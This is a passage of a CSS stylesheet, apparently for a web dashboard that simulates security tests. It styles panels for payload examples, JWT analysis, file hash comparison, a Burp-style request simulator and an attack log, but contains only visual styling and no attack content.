}

.test-results, .payload-examples, .file-comparison, .jwt-analysis {
  margin-top: 15px;
}

.test-results h5, .payload-examples h5, .file-comparison h5, .jwt-analysis h5 {
  color: #64ffda;
  margin-bottom: 10px;
}

.result-content {
  background: rgba(0, 0, 0, 0.3);
  padding: 15px;
  border-radius: 5px;
  border-left: 4px solid #64ffda;
  font-family: 'Consolas', monospace;
  white-space: pre-wrap;
  max-height: 200px;
  overflow-y: auto;
}

.payload-list {
  display: grid;
  gap: 10px;
}

.payload-list > div {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 5px;
}

.payload-list code {
  color: #ff4081;
  font-family: 'Consolas', monospace;
  padding: 2px 5px;
  background: rgba(255, 64, 129, 0.1);
  border-radius: 3px;
}

.payload-list span {
  flex-grow: 1;
  color: #b0b0b0;
}

.btn-small {
  background: #64ffda;
  color: #0a0e17;
  border: none;
  padding: 3px 8px;
  border-radius: 3px;
  cursor: pointer;
  font-size: 0.8em;
}

.file-comparison .comparison-chart {
  display: grid;
  gap: 10px;
}

.file-item {
  display: grid;
  grid-template-columns: 150px 200px 1fr;
  gap: 10px;
  align-items: center;
  padding: 10px;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 5px;
}

.file-name {
  color: #64ffda;
  font-weight: bold;
}

.file-hash {
  color: #ff4081;
  font-family: 'Consolas', monospace;
  font-size: 0.9em;
}

.file-similarity {
  background: linear-gradient(90deg, #4caf50, #f44336);
  padding: 5px 10px;
  border-radius: 3px;
  color: white;
  text-align: center;
  transition: width 1s ease-in-out;
}

.jwt-details {
  background: rgba(0, 0, 0, 0.3);
  padding: 15px;
  border-radius: 5px;
  font-family: 'Consolas', monospace;
  font-size: 0.9em;
}

.burp-simulator {
  background: rgba(255, 255, 255, 0.05);
  border-radius: 10px;
  padding: 20px;
  margin-bottom: 30px;
  border: 1px solid #333;
}

.burp-simulator h3 {
  color: #ff9800;
  margin-bottom: 15px;
}

.burp-controls {
  display: flex;
  gap: 10px;
  margin-bottom: 15px;
}

.btn-burp {
  background: #ff9800;
  color: #0a0e17;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  font-weight: bold;
}

.btn-burp:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.btn-burp-danger {
  background: #f44336;
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  font-weight: bold;
}

.request-details {
  background: rgba(0, 0, 0, 0.3);
  padding: 15px;
  border-radius: 5px;
  font-family: 'Consolas', monospace;
  font-size: 0.9em;
}

.attack-log {
  background: rgba(255, 255, 255, 0.05);
  border-radius: 10px;
  padding: 20px;
  border: 1px solid #333;
}

.attack-log h3 {
  color: #64ffda;
  margin-bottom: 15px;
}

.log-entries {
  max-height: 300px;
  overflow-y: auto;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 5px;
  padding: 10px;
}

.log-entry {
  padding: 8px 12px;
  margin-bottom: 5px;
  border-left: 4px solid #64ffda;
  background: rgba(100, 255, 218, 0.05);
  font-size: 0.9em;
}

.log-entry.info {
  border-left-color: #64ffda;
}

.log-entry.warning {
  border-left-color: #ff9800;
}

.log-entry.danger {
  border-left-color: #f44336;
}

.log-entry.error {
  border-left-color: #d32f2f;
}

.log-time {
  color: #64ffda;
  margin-right: 15px;
  font-size: 0.8em;
}

.log-message {
  color: #e0e0e0;
}

/* 滚动条样式 */
::-webkit-scrollbar {
  width: 8px;
}

::-webkit-scrollbar-track {
  background: rgba(255, 255, 255, 0.05);
}

::-webkit-scrollbar-thumb {
  background: #64ffda;
  border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
  background: #ff4081;
}
</style>